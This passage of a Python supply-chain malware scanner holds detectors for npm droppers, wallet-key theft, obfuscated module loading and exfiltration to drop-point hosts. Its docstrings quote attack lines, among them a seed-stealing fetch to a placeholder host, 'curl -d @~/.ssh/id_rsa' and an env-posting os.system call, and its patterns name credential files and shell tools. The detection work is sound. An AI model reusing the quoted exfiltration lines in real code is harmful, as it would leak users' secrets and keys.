        r"request\s{0,4}\.\s{0,4}get|download)\s{0,4}\("
    )
    _JS_WRITE = re.compile(
        r"\b(?:writeFileSync|writeFile|createWriteStream|appendFileSync|copyFileSync)\s{0,4}\("
    )
    _JS_SPAWN = re.compile(r"\b(?:execSync|exec|execFileSync|execFile|spawnSync|spawn)\s{0,4}\(")
    _RUNS_A_FILE = re.compile(
        r"(?i)(?:^|[\s'\"`(,\[])(?:sh|bash|zsh|dash|powershell(?:\.exe)?|pwsh|cmd(?:\.exe)?\s{1,4}/c|"
        r"python[0-9.]{0,4}|perl|ruby|wscript|cscript|mshta)(?:[\s'\"`,\]]|$)"
        # `start` runs a file -- or opens a link in the browser: `start "" "${extUrl}"` is how an
        # extension opens a URL on Windows. Not when what it starts is a URL or names one.
        r"|(?:^|[\s'\"`(,\[])start(?:[\s'\"`,\]]|$)(?![^;\n]{0,60}(?:https?:|(?<!c)url\b|link|href))"
        r"|chmod\s{1,4}(?:\+x|[0-7]{3,4})|\.(?:exe|sh|bat|cmd|ps1|vbs|scr)\b"
    )
    _JS_ARGUMENT_WINDOW = 400

    @classmethod
    def _js_downloaded_and_run(
        cls, content: FileContent, language: str | None
    ) -> list[CapabilityHit]:
        """A file fetched over the network, written to disk and run, in one JavaScript file.

        `http.get(url)` piped into `fs.createWriteStream("x.sh")`, then `exec("sh ./x.sh")`:
        nothing is decoded and nothing is piped into a shell on one line, so neither the
        fetch-and-execute patterns nor the decode composites see it -- and it is the commonest
        install-hook dropper in the npm dataset. What separates it from esbuild or a browser
        download at install is how the file is run: a package that fetches its own binary
        executes that binary; a dropper hands what it fetched to an interpreter, makes it
        executable, or starts a `.exe`, `.sh` or `.ps1`. Recorded at the process launch, as
        `fetch_exec`, so the composites judge it with the context they already use.
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if not cls._JS_DOWNLOAD.search(text) or not cls._JS_WRITE.search(text):
            return []
        for launch in cls._JS_SPAWN.finditer(text):
            window = text[launch.end() : launch.end() + cls._JS_ARGUMENT_WINDOW]
            arguments = window.split(";", 1)[0]
            if cls._RUNS_A_FILE.search(arguments) is None:
                continue
            start = len(text[: launch.start()].encode("utf-8"))
            line = text.count("\n", 0, launch.start()) + 1
            return [
                CapabilityHit(
                    capability=Capability.FETCH_EXEC,
                    rule_id="CAP.JS.DOWNLOAD_THEN_RUN",
                    byte_start=start,
                    byte_end=start + len(launch.group(0).encode("utf-8")),
                    line=line,
                )
            ]
        return []

    #: A request: `fetch(`, an `axios`/`got`/`needle`/`superagent`/`request` call, jQuery's.
    _JS_REQUEST: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?:fetch|axios(?:\.\w{1,12})?|got(?:\.\w{1,12})?|needle(?:\.\w{1,12})?|"
        r"superagent(?:\.\w{1,12})?|request(?:\.\w{1,12})?|\$\.(?:post|ajax))\s{0,4}\("
    )
    _JS_EXTERNAL_URL: ClassVar[re.Pattern[str]] = re.compile(
        r"[\"'`]https?://(?!(?:localhost|127\.|0\.0\.0\.0|\[::1\]))[^\"'`\s/]{3,200}"
    )
    #: What a wallet is opened with. `seed` is a random seed as often as a wallet's, so it counts
    #: only in a file that is about wallets (`_JS_WALLET_CONTEXT`).
    _JS_WALLET_SECRET: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$\"'`-])(?P<name>mnemonic(?:Phrase)?|seedPhrase|secretPhrase|privateKey|privKey|"
        r"private_key|secretKey|secret_key|walletSecret|seed)(?![\w$])(?!\s{0,4}[:(=])"
    )
    _JS_WALLET_CONTEXT: ClassVar[re.Pattern[str]] = re.compile(
        r"\b(?:[Ww]allet|mnemonic|[Kk]eypair|fromSeed|deriveKeypair|bip39|bip32|ethers|xrpl|solana|"
        r"web3)\b"
    )

    @classmethod
    def _js_wallet_secret_sent(
        cls, content: FileContent, language: str | None
    ) -> list[CapabilityHit]:
        """A wallet's secret handed to a request bound for a fixed outside address.

        The compromised `xrpl` 4.2.1 (April 2025) did it in one call, on every wallet the library
        opened: `fetch("https://<host>/xc", { method: "POST", headers: { "ad-referral": seed } })`.
        A wallet library signs with the secret and sends what it signed; nothing it does needs the
        mnemonic or the private key itself to leave the process. The secret has to be a value in
        the request's arguments -- `{ seed: 1 }` names a field -- and the address a literal, not
        the node the user configured (review 98).
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if "http" not in text or cls._JS_WALLET_SECRET.search(text) is None:
            return []
        wallet_file = cls._JS_WALLET_CONTEXT.search(text) is not None
        for request in cls._JS_REQUEST.finditer(text):
            window = text[request.end() : request.end() + 600]
            call = window.split(";\n", 1)[0]
            if cls._JS_EXTERNAL_URL.match(call.lstrip()) is None:
                continue
            for secret in cls._JS_WALLET_SECRET.finditer(call):
                if secret.group("name") == "seed" and not wallet_file:
                    continue
                start = len(text[: request.start()].encode("utf-8"))
                return [
                    CapabilityHit(
                        capability=Capability.CREDENTIAL,
                        rule_id="CAP.JS.WALLET_SECRET_SENT",
                        byte_start=start,
                        byte_end=start + len(request.group(0).encode("utf-8")),
                        line=text.count("\n", 0, request.start()) + 1,
                    )
                ]
        if wallet_file:
            return cls._js_wallet_secret_through_helper(text)
        return []

    #: Both ends of a flow must be possible before the dataflow analysis is worth running.
    _JS_FLOW_SOURCE: ClassVar[re.Pattern[str]] = re.compile(
        r"process\.env|\bos\.|require\(\s*['\"](?:node:)?os['\"]|from\s+['\"](?:node:)?os['\"]|readFile|readdir"
        r"|createReadStream|privateKey|secretKey|mnemonic|seedPhrase|homedir|document\.cookie|localStorage"
        r"|clipboard"
    )
    _JS_FLOW_SINK: ClassVar[re.Pattern[str]] = re.compile(
        r"\bfetch\s*\(|axios|https?['\"]|\.request\s*\(|WebSocket|XMLHttpRequest|\bdns\b|child_process"
        r"|sendBeacon|node-fetch|undici|\bgot\b|superagent|needle|\bnet['\"]|\btls['\"]"
    )
    #: The flows reported, by source kind, and the sinks at which each is one. A secret leaves
    #: through a request, a connection, a lookup or a child process (`curl -d @~/.ssh/id_rsa`);
    #: the environment or the host name handed to a child process stays on this machine; what a
    #: server sent is judged where it is executed.
    _JS_FLOW_RULES: ClassVar[tuple[tuple[str, str, frozenset[str]], ...]] = (
        (
            "secret_file",
            "CAP.JS.FLOW.SECRET_FILE_SENT",
            frozenset({"request", "connection", "dns", "process"}),
        ),
        (
            "wallet_key",
            "CAP.JS.FLOW.WALLET_KEY_SENT",
            frozenset({"request", "connection", "dns", "process"}),
        ),
        (
            "home_file",
            "CAP.JS.FLOW.HOME_FILE_SENT",
            frozenset({"request", "connection", "dns", "process"}),
        ),
        ("identity", "CAP.JS.FLOW.IDENTITY_SENT", frozenset({"request", "connection", "dns"})),
        (
            "environment",
            "CAP.JS.FLOW.ENVIRONMENT_SENT",
            frozenset({"request", "connection", "dns"}),
        ),
        ("network_response", "CAP.JS.FLOW.REMOTE_CODE", frozenset({"execute", "process"})),
    )

    @classmethod
    def _js_flows(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """Sensitive values followed to where they leave, through bindings, helpers and callbacks
        (`detect/js_flow.py`) -- the same act as the proximity composites, without needing the
        read and the send to sit close. One hit per (rule, sink line); `detail` carries the
        destination's kind (drop, ip, fixed, unknown) and the sink's (request, connection, dns,
        process) for the composites to judge."""
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if cls._JS_FLOW_SOURCE.search(text) is None or cls._JS_FLOW_SINK.search(text) is None:
            return []
        from cordon_scanner.detect.js_eval import JsEval
        from cordon_scanner.detect.js_flow import JsFlow
        from cordon_scanner.detect.js_fold import JsFold

        try:
            # Read where the evaluator writes out computed names and hosts; lines are kept.
            view = (
                JsEval.resolve(JsFold.fold(text))
                if len(text) <= cls._JS_EVAL_MAX_BYTES
                and cls._JS_EVAL_MARKERS.search(text)
                and not cls._bundled(content)
                else text
            )
            flows = JsFlow.flows(view)
        except (IndexError, KeyError, ValueError, TypeError, RecursionError):
            return []  # read as written: every other rule still applies
        starts = [0]
        for index, char in enumerate(text):
            if char == "\n":
                starts.append(index + 1)
        hits: list[CapabilityHit] = []
        for flow in flows:
            for kind, rule_id, sinks in cls._JS_FLOW_RULES:
                if kind not in flow.sources or flow.sink not in sinks:
                    continue
                offset = starts[min(flow.line, len(starts)) - 1]
                start = len(text[:offset].encode("utf-8"))
                hits.append(
                    CapabilityHit(
                        capability=Capability.FLOW,
                        rule_id=f"{rule_id}.{flow.destination.upper()}",
                        byte_start=start,
                        byte_end=start + 1,
                        line=flow.line,
                    )
                )
        return hits

    #: A one-parameter function or method: `static addToQueue(process) {`, `function q(k) {`,
    #: `const q = (k) => {`.
    _JS_ONE_PARAM_FUNCTION: ClassVar[re.Pattern[str]] = re.compile(
        r"(?:(?:static\s+|async\s+)?(?P<method>[A-Za-z_$][\w$]{0,60})\s*\(\s*(?P<p1>[A-Za-z_$][\w$]{0,40})\s*\)\s*\{"
        r"|function\s+(?P<fn>[A-Za-z_$][\w$]{0,60})\s*\(\s*(?P<p2>[A-Za-z_$][\w$]{0,40})\s*\)\s*\{"
        r"|(?:const|let|var)\s+(?P<arrow>[A-Za-z_$][\w$]{0,60})\s*=\s*(?:async\s*)?\(?\s*(?P<p3>[A-Za-z_$][\w$]{0,40})\s*\)?\s*=>\s*\{)"
    )

    @classmethod
    def _js_wallet_secret_through_helper(cls, text: str) -> list[CapabilityHit]:
        """The same, one call away: the wallet hands its key to a helper, and the helper puts
        what it was given -- or a value made from it -- into a request to a fixed outside address.

        The compromised `@solana/web3.js` 1.95.7 (December 2024): every `Keypair` constructor
        called `Loader.addToQueue(this._secretKey)`, and `addToQueue(process)` base58-encoded its
        argument into the headers of a `fetch` to an outside host. Read one call at a time,
        neither half says it: the constructor sends nothing and the helper names no secret.
        """
        for found in cls._JS_ONE_PARAM_FUNCTION.finditer(text):
            name = found.group("method") or found.group("fn") or found.group("arrow")
            param = found.group("p1") or found.group("p2") or found.group("p3")
            if name in ("if", "for", "while", "switch", "catch", "function", "return"):
                continue
            body = text[found.end() : found.end() + 2000]
            depth, end = 1, len(body)
            for index, char in enumerate(body):
                depth += char == "{"
                depth -= char == "}"
                if depth == 0:
                    end = index
                    break
            body = body[:end]
            request = cls._JS_REQUEST.search(body)
            if request is None:
                continue
            call = body[request.end() : request.end() + 600]
            if cls._JS_EXTERNAL_URL.match(call.lstrip()) is None:
                continue
            # The parameter, and names assigned from it before the request.
            carried = {param} | {
                m.group(1)
                for m in re.finditer(
                    r"(?:const|let|var)\s+([A-Za-z_$][\w$]{0,40})\s*=\s*[^;\n]{0,200}?(?<![\w$])"
                    + re.escape(param)
                    + r"(?![\w$])",
                    body[: request.start()],
                )
            }
            if not any(
                re.search(rf"(?<![\w$.\"'`]){re.escape(n)}(?![\w$])", call) for n in carried
            ):
                continue
            caller = re.search(
                rf"(?<![\w$])(?:[\w$]+\.)?{re.escape(name)}\s*\(\s*(?:this\.)?_?(?:secretKey|privateKey|"
                rf"privKey|secret_key|private_key|mnemonic|seedPhrase|secretPhrase)\s*\)",
                text,
            )
            if caller is None:
                continue
            start = len(text[: caller.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.CREDENTIAL,
                    rule_id="CAP.JS.WALLET_SECRET_SENT",
                    byte_start=start,
                    byte_end=start + len(caller.group(0).encode("utf-8")),
                    line=text.count("\n", 0, caller.start()) + 1,
                )
            ]
        return []

    _JS_REQUIRE_CALL: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])require\s{0,4}\(\s{0,4}(?P<decoder>[A-Za-z_$][\w$]{0,40})\s{0,4}\("
    )
    #: Helpers that legitimately compute what to load: a path, a resolver, a plugin finder.
    _JS_LOADER_HELPER: ClassVar[re.Pattern[str]] = re.compile(
        r"(?i)path|join|resolve|dir|file|module|plugin|config|load|locate|find|require|import|get"
    )
    _JS_DECODER_CALLS: ClassVar[int] = 10
    #: A module name decoded from a literal on the spot: hex, base64, char codes or a byte array.
    _JS_DECODED_REQUIRE: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?:require|import)\s{0,4}\(\s{0,24}(?:"
        r"Buffer\s{0,4}\.\s{0,4}from\s{0,4}\(\s{0,4}(?:[\"'][A-Za-z0-9+/=]{2,200}[\"']\s{0,4},\s{0,4}"
        r"[\"'](?:hex|base64|base64url)[\"']|\[[\d\s,x]{1,400}\])\s{0,4}\)\s{0,4}\.\s{0,4}toString"
        r"|atob\s{0,4}\(\s{0,4}[\"'][A-Za-z0-9+/=]{2,200}[\"']"
        r"|String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\("
        r")"
    )

    @staticmethod
    def _bundled(content: FileContent) -> bool:
        """Compiled or bundled output: a dist/out/build directory, a .min/.bundle file, or a file
        too large to be a hand-written script."""
        return CapabilityDetector._bundled_path(content.path) or len(content.raw) > 100_000

    @staticmethod
    def _bundled_path(path: str) -> bool:
        """`_bundled` by the path alone: a dist/out/build directory or a .min/.bundle file."""
        member = path.rpartition("!")[2]
        return bool(
            re.search(
                r"(?:^|/)(?:dist|out|build|bundle|webpack)/|\.(?:min|bundle)\.[cm]?js$", member
            )
        )

    _JS_CODE_ARRAY_CALL: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?P<decoder>[A-Za-z_$][\w$]{0,20})\(\s{0,4}\[\s{0,4}\d{2,3}(?:\s{0,4},\s{0,4}\d{2,3}){1,60}\s{0,4}\]\s{0,4}\)"
    )

    @classmethod
    def _js_spelled_names(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """Names reached through a local decoder of character codes, four times or more.

        `global[d([112,114,111,99,101,115,115])]`, `module.constructor[d([95,108,111,97,100])]`:
        when the module loader, the module and the call are all spelled as codes, no name the
        other rules read is left (review 98, dax-styles). One decoded string is a constant; a
        file that reaches four things this way is hiding what it reaches.
        """
        if (
            language not in ("javascript", "typescript")
            or "fromCharCode" not in content.text
            or CapabilityDetector._bundled(content)
        ):
            return []
        counts: dict[str, list[re.Match[str]]] = {}
        for match in cls._JS_CODE_ARRAY_CALL.finditer(content.text):
            counts.setdefault(match.group("decoder"), []).append(match)
        for decoder, calls in counts.items():
            if decoder in ("fromCharCode", "Array", "Uint8Array", "Buffer") or len(calls) < 4:
                continue
            first = calls[0]
            start = len(content.text[: first.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.SPELLED_NAMES",
                    byte_start=start,
                    byte_end=start + len(first.group(0).encode("utf-8")),
                    line=content.text.count("\n", 0, first.start()) + 1,
                )
            ]
        return []

    @classmethod
    def _js_computed_require(
        cls, content: FileContent, language: str | None
    ) -> list[CapabilityHit]:
        """Modules required by names a local decoder produces: `require(_d([...]))`.

        A string-array obfuscator hides every module name, so `require("https")` -- the egress
        the composites need -- is never written. What is left is the shape: `require` handed the
        result of a local function that the file calls many times. `@sbxapps/...` (2026) reads
        cloud, SSH and npm credentials from its `preinstall` this way, with nine computed
        requires through one decoder called 217 times (review 98). Recorded as
        `dynamic_dispatch`, so the install-hook composite decides what it means; a path or a
        plugin resolver (`require(path.join(...))`) is not a decoder.
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if "require" not in text and "import" not in text:
            return []
        # The same disguise without a decoder function: `require(Buffer.from("6f73",
        # "hex").toString())` loads `os` under a name nobody reads. No package hides which module
        # it loads; a campaign of 28 releases ran its collector from `postinstall` this way, each
        # module name in hex (review 98). One is enough: there is no benign reading of it.
        decoded = cls._JS_DECODED_REQUIRE.search(text)
        if decoded is not None:
            start = len(text[: decoded.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.COMPUTED_REQUIRE",
                    byte_start=start,
                    byte_end=start + len(decoded.group(0).encode("utf-8")),
                    line=text.count("\n", 0, decoded.start()) + 1,
                )
            ]
        if "require" not in text:
            return []
        # `require` under another name first: `const _r = require; _r(_d("6f73"))` (review 98:
        # a preinstall's helper loading os, dns and https through a hex decoder and an alias).
        # Not in a bundle: a bundler aliases `require` as routinely as it renames everything else.
        bundled = re.search(
            r"(?:^|/)(?:dist|out|build|bundle|webpack)/|\.(?:min|bundle)\.[cm]?js$|\.vsix!",
            content.path.rpartition("!")[2] if ".vsix!" not in content.path else content.path,
        )
        aliases = (
            []
            if bundled or len(text) > 100_000
            else [
                m.group(1)
                for m in re.finditer(
                    r"(?:const|let|var)\s{1,4}([A-Za-z_$][\w$]{0,40})\s{0,4}=\s{0,4}require\s{0,4}[;,\n]",
                    text,
                )
            ]
        )
        calls = list(cls._JS_REQUIRE_CALL.finditer(text))
        for alias in aliases:
            calls += list(
                re.finditer(
                    rf"(?<![\w$.]){re.escape(alias)}\s{{0,4}}\(\s{{0,4}}(?P<decoder>[A-Za-z_$][\w$]{{0,40}})\s{{0,4}}\(",
                    text,
                )
            )
        for match in calls:
            decoder = match.group("decoder")
            if cls._JS_LOADER_HELPER.search(decoder):
                continue
            calls = len(re.findall(rf"(?<![\w$.]){re.escape(decoder)}\s{{0,4}}\(", text))
            if calls < cls._JS_DECODER_CALLS:
                continue
            start = len(text[: match.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.COMPUTED_REQUIRE",
                    byte_start=start,
                    byte_end=start + len(match.group(0).encode("utf-8")),
                    line=text.count("\n", 0, match.start()) + 1,
                )
            ]
        return []

    @classmethod
    def _destination_capabilities(
        cls, content: FileContent, language: str | None = None
    ) -> list[CapabilityHit]:
        """Egress to a destination that means something on its own.

        Webhook ingest URLs, anonymous paste and file-drop services, and
        out-of-band interaction hosts. None of these is a finding by itself --
        software does post to webhooks -- but each is a place with no reason to
        appear in a build, an install script or a library, so it raises what an
        outbound request in that file is worth.

        The host list lives in `intel/hosts.py` rather than in a pattern pack.
        A pack would have to restate it, and a restated blocklist drifts, which
        is worse than a short one because it still looks maintained.
        """
        from cordon_scanner.intel.hosts import Destinations

        raw = content.raw
        literal_ip = cls._public_ip_url(content, language)

        # A substring prefilter, for the same reason the rule engine has one:
        # the alternation over every host is around eight hundred bytes and
        # cost roughly five milliseconds per file when it ran unconditionally,
        # which was enough to put a large repository over its latency budget by
        # itself. Almost every file is rejected here without a regex running.
        if not Destinations.could_match(raw):
            return literal_ip

        # Skipping documentation, which names a host without contacting one.
        # This searched the raw bytes and took the first hit, so a module whose
        # opening paragraph explains what it drives was read as driving it --
        # see `core.comments.docstring_spans` for the case that found it. The
        # later occurrences are still considered, because the first being prose
        # says nothing about the rest of the file.
        from cordon_scanner.core.comments import SourceComments

        ignore = SourceComments.docstring_spans(raw, language)
        blocks = SourceComments.block_comment_spans(content.text, language)

        match = None
        for candidate in Destinations.destination_matcher().finditer(raw):
            offset = candidate.start()
            if SourceComments.inside_spans(ignore, offset) or SourceComments.inside_spans(
                blocks, offset
            ):
                continue
            if cls._is_comment(content, offset, language):
                continue
            match = candidate
            break
        if match is None:
            return literal_ip

        found = [
            CapabilityHit(
                capability=Capability.EGRESS,
                rule_id=cls.DROP_POINT_RULE,
                byte_start=match.start(),
                byte_end=match.end(),
                line=content.line_of(match.start()),
            )
        ]
        from cordon_scanner.intel.hosts import Destinations

        host = match.group(0).decode("utf-8", "replace").split("//")[-1].split("/")[0]
        if Destinations.is_interaction_host(host):
            found.append(
                CapabilityHit(
                    capability=Capability.EGRESS,
                    rule_id=cls.INTERACTION_RULE,
                    byte_start=match.start(),
                    byte_end=match.end(),
                    line=content.line_of(match.start()),
                )
            )
        return found

    _IP_URL = re.compile(
        rb"\bhttps?://(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})(?::\d{1,5})?(?:/|[\"'\s]|$)"
    )
    # The same address given as a host rather than inside a URL: `const TARGET_HOST =
    # '154.57.164.64'` handed to `http.request({hostname: TARGET_HOST})`, or a socket's
    # `connect(4444, '154.57.164.64')`. A bare four-part string is as often a version number,
    # so it counts only where the line names it as a host.
    _IP_HOST = re.compile(
        rb"(?i)(?:\b[a-z_]*host[a-z_]*[\"']?\s*[:=]|\b(?:connect|createConnection)\(\s*(?:\d{1,5}\s*,\s*)?)"
        rb"\s*[\"'](\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})[\"']"
    )
    # What every match of each must contain, as a pattern the regex engine scans for fast (a
    # literal or a two-character class first, where the full patterns open on `\b`): over ten
    # thousand files of ordinary packages the two ran on every one, 7.8 s for five files with any
    # match, and 1.2 s gated, with the same matches.
    _IP_URL_GATE = re.compile(rb"https?://\d")
    _IP_HOST_GATE = re.compile(rb"[\"']\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[\"']")
    # Public resolvers, which network checks and DNS clients name as hosts all the time, and
    # the made-up addresses examples and fixtures use (`"host": "1.2.3.4"`): public on paper,
    # reached by nobody.
    _RESOLVERS: ClassVar[frozenset[tuple[int, ...]]] = frozenset(
        {
            (1, 1, 1, 1), (1, 0, 0, 1), (8, 8, 8, 8), (8, 8, 4, 4), (9, 9, 9, 9),
            (208, 67, 222, 222), (1, 2, 3, 4), (4, 3, 2, 1), (5, 6, 7, 8), (12, 34, 56, 78),
            (11, 22, 33, 44), (123, 123, 123, 123), (123, 45, 67, 89),
        }
    )  # fmt: skip

    @classmethod
    def _public_ip_url(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """A URL, or a host setting, whose host is a literal public IPv4 address.

        Services are reached by name; a payload posting the environment to
        `http://54.242.228.151:8090/` does not have one. Loopback, private, link-local -- the
        cloud metadata service at 169.254.169.254 -- and the documentation ranges are ordinary
        in code and tests and are not counted.
        """
        from cordon_scanner.core.comments import SourceComments

        ignore: tuple[tuple[int, int], ...] | None = None
        raw = content.raw
        matches = [
            *(cls._IP_URL.finditer(raw) if cls._IP_URL_GATE.search(raw) else ()),
            *(cls._IP_HOST.finditer(raw) if cls._IP_HOST_GATE.search(raw) else ()),
        ]
        for match in sorted(matches, key=lambda m: m.start()):
            octets = [int(part) for part in match.groups()]
            if any(o > 255 for o in octets) or not cls._is_public(octets):
                continue
            if tuple(octets) in cls._RESOLVERS:
                continue
            # Docstrings are worked out only once a public address is found: almost no file has
            # one, and the spans mean parsing the file.
            if ignore is None:
                ignore = SourceComments.docstring_spans(content.raw, language)
            if SourceComments.inside_spans(ignore, match.start()) or cls._is_comment(
                content, match.start(), language
            ):
                continue
            return [
                CapabilityHit(
                    capability=Capability.EGRESS,
                    rule_id=cls.DROP_POINT_RULE,
                    byte_start=match.start(),
                    byte_end=match.end(),
                    line=content.line_of(match.start()),
                )
            ]
        return []

    @staticmethod
    def _is_public(octets: list[int]) -> bool:
        a, b, c = octets[0], octets[1], octets[2]
        return not (
            a in (0, 10, 127)
            or a >= 224
            or (a == 169 and b == 254)
            or (a == 172 and 16 <= b <= 31)
            or (a == 192 and b == 168)
            or (a == 100 and 64 <= b <= 127)
            or (a, b, c) in ((192, 0, 2), (198, 51, 100), (203, 0, 113))
            or (a == 198 and b in (18, 19))
        )

    def _embedded_capabilities(
        self, ctx: ScanContext, content: FileContent, commands: list[Command]
    ) -> list[CapabilityHit]:
        """Shell rules, applied to shell commands written inside other languages.

        A command handed to a spawn primitive is shell, whatever the file
        extension says. Without this it is examined by the rules for the host
        language, which see a string literal, and never by the rules that know
        what the string means -- so `os.system("curl -d $(env) https://...")`
        reads as one unremarkable spawn rather than as exfiltration.

        Only the command text is matched, never the surrounding file, so this
        cannot pick up a URL from a comment or an example from a docstring. The
        hit is attributed to the line the call is on, which is where a reader
        needs to look.
        """
        if not commands:
            return []

        if content.path.endswith((".sh", ".bash", ".zsh", ".ps1", ".psm1")):
            # A command the shell rules already matched in the file itself is not
            # examined twice; running them again would double the evidence without
            # adding anything to it.
            #
            # A DECODED command is the exception, and the reason this is a filter
            # rather than a return. It was base64 a moment ago, so it is not in the
            # file for any rule to have matched -- and dropping it here is what let
            # `powershell -EncodedCommand <blob>` in a `.ps1` scan clean while the
            # same line inside a `setup.py` was reported.
            commands = [command for command in commands if command.text not in content.text]
            if not commands:
                return []

        # Paired with their capability here so the match loop has nothing
        # optional left to unwrap.
        shell_rules = [
            (compiled, compiled.rule.capability)
            for compiled in ctx.rules.for_language("shell")
            if compiled.rule.capability is not None and compiled.match.regex is not None
        ]
        if not shell_rules:
            return []

        hits: list[CapabilityHit] = []
        seen: set[str] = set()

        for command in commands:
            payload = command.text.encode("utf-8", "surrogatepass")
            for compiled, capability in shell_rules:
                if compiled.id in seen or compiled.match.regex is None:
                    continue
                regex = compiled.match.regex_for(payload)
                if regex is None or regex.search(payload) is None:
                    continue
                seen.add(compiled.id)
                start, end = self._span_of_line(content, command.line)
                hits.append(
                    CapabilityHit(
                        capability=capability,
                        rule_id=compiled.id,
                        byte_start=start,
                        byte_end=end,
                        line=command.line,
                    )
                )

        return hits

    # -- Reasoning -------------------------------------------------------

    def _composite_findings(
        self,
        unit: FileUnit,
        ctx: ScanContext,
        hits: list[CapabilityHit],
        candidates: tuple[CompiledRule, ...],
    ) -> Iterable[Finding]:
        if not hits:
            return

        # Depth is summed over distinct operations rather than over rules. One
        # decode rule covers base64, hex and decompression, so counting rules
        # cannot tell one decoding step from three.
        #
        # The AST tier is excluded. It is a second view of the same call --
        # resolving what a pattern could not see, not finding another decode --
        # so counting it too would make every parsed Python file appear to
        # decode twice. That reasoning lives in `_evaluate_over`, which is
        # where the counting now happens, because a composite with a proximity
        # counts what is inside its window rather than what is in the file.
        in_hook = ctx.in_install_hook(unit.path)
        in_ci = ctx.in_ci_hook(unit.path)
        in_consumer = ctx.in_consumer_install(unit.path)
        # Read by the `install_entry` term. Composites are evaluated one file at a time.
        self._in_entry = unit.path in ctx.install_entry_paths
        # A published package's own entry point, run on `require()`/`import` (REC-2).
        self._in_import_entry = unit.path in ctx.import_entry_paths
        # Install-time context is decided per WINDOW, not per file. A file is in
        # the closure because a hook imports it, and importing a module defines
        # its functions without calling them -- so a pair of capabilities inside
        # a body nothing reaches does not run at install time, whatever the file
        # does. See `ScanContext.install_hook_reaches`.
        deferred = (
            frozenset(
                (first, last)
                for path, first, last in ctx.install_deferred_lines
                if path == unit.path
            )
            if in_hook
            else frozenset()
        )

        for compiled in candidates:
            if compiled.match.kind is not MatchKind.COMPOSITE:
                continue
            if compiled.match.scope not in {"file", "function"}:
                continue

            rule_hits = (
                [h for h in hits if not self._a_setting(unit.content, h)]
                if compiled.rule.id in self.SETTINGS_ARE_NOT_LOOT
                else hits
            )
            if compiled.rule.id in self.CONTEXT_FREE:
                window = self._satisfying_window(
                    compiled, rule_hits, unit.path, False, False, False, frozenset()
                )
            else:
                window = self._satisfying_window(
                    compiled, rule_hits, unit.path, in_hook, in_ci, in_consumer, deferred
                )
            if window is None:
                continue

            matched_capabilities = self._capabilities_of(compiled)
            if (
                Capability.CREDENTIAL in matched_capabilities
                and Capability.EGRESS in matched_capabilities
                and self._credential_reaches_its_own_issuer(unit.content, window)
            ):
                # Authentication, not exfiltration. See
                # `_credential_reaches_its_own_issuer`.
                continue

            local_by_capability = {hit.capability: hit for hit in window}
            matched = matched_capabilities
            anchor = self._anchor(matched, local_by_capability, window)

            finding = self._composite_finding(
                compiled, unit, ctx, anchor, matched, window, file_hits=hits
            )
            if finding is not None:
                yield finding

    #: Composites whose source half is what a file sends: a setting it reads to configure itself is
    #: not that. See `_a_setting`.
    SETTINGS_ARE_NOT_LOOT: ClassVar[frozenset[str]] = frozenset({"SUSPECT.EXFIL.DROP_POINT.001"})

    _SETTING_READ: ClassVar[re.Pattern[str]] = re.compile(
        r"""^\s{0,8}(?:
            process\.env\.(?P<dotted>[A-Za-z_][A-Za-z0-9_]{0,80})\b(?!\s{0,4}[\[(])
          | (?:os\.(?:getenv|environ\.get|environ\s{0,4}\[)|process\.env\s{0,4}\[
             |std::env::var(?:_os)?\s{0,4}\(|env!\s{0,4}\(|ENV(?:\.fetch\s{0,4}\(|\s{0,4}\[)
             |System\.getenv\s{0,4}\(|Environment\.GetEnvironmentVariable\s{0,4}\(
             |os\.Getenv\s{0,4}\()
            \s{0,4}\(?\s{0,4}["'](?P<quoted>[A-Za-z_][A-Za-z0-9_]{0,80})["']
        )""",
        re.VERBOSE,
    )
    """One environment variable read by its literal name: `os.getenv("TELEGRAM_BOT_TOKEN")`,
    `process.env.DINGTALK_TOKEN`, `std::env::var("SMTP_SERVER")`. A name computed at run time
    (`os.getenv(k)`) is not this: a loop over names is how a stealer reads a list of them."""

    _PLATFORM_LOOKUP: ClassVar[re.Pattern[str]] = re.compile(
        r"^\s{0,8}(?:platform\.(?:machine|system|architecture|processor|python_version)\s{0,4}\("
        r"|os\.(?:homedir|platform|arch|tmpdir|cpus|endianness)\s{0,4}\("
        r"|process\.(?:platform|arch)\b|sys\.platform\b)"
    )
    """What the machine is, not who: the architecture a download is picked for, the home
    directory a config file is kept under."""

    @classmethod
    def _a_setting(cls, content: FileContent, hit: CapabilityHit) -> bool:
        """Whether a credential or reconnaissance hit reads only a setting the file configures
        itself with, so that it is not what a request to a drop point carries away.

        A notifier reads its bot token and posts a message; a stealer reads the environment, the
        user and host names, or the public address, and posts those (review 98: the 62 benign
        units blocked by `SUSPECT.EXFIL.DROP_POINT.001` alone against 16 malware samples, every
        one of which sends identity or the whole environment). A named setting that is a
        well-known credential of another service (`NPM_TOKEN`, `GITHUB_TOKEN`, AWS keys -- see
        `secretflow.CREDENTIAL_HOMES`) is loot whatever reads it.
        """
        if hit.capability not in (Capability.CREDENTIAL, Capability.RECONNAISSANCE):
            return False
        if hit.rule_id.endswith("_SENT") or "PUBLIC_IP" in hit.rule_id:
            return False
        end = min(hit.byte_end, hit.byte_start + 240)
